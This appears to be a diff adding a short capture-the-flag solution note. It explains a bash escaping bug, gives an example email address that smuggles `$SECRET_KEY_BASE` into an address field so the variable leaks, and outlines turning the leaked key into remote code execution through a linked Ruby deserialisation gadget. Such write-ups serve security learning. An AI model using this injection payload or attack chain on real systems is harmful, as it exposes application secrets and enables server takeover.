@@ -1,0 +1,3 @@
+* There is a bug in bash that means `\^A\$` will be interpreted as `\\$` allowing environment variabled to be interpolated - https://lists.gnu.org/archive/html/bug-bash/2007-03/msg00065.html
+* This can be used to leak the SECRET_KEY_BASE by sending an email to something like `vakzz+\x01$SECRET_KEY_BASE@mail.aw.rs`
+* The secret key base can then be used to get RCE and read the flag using something like https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
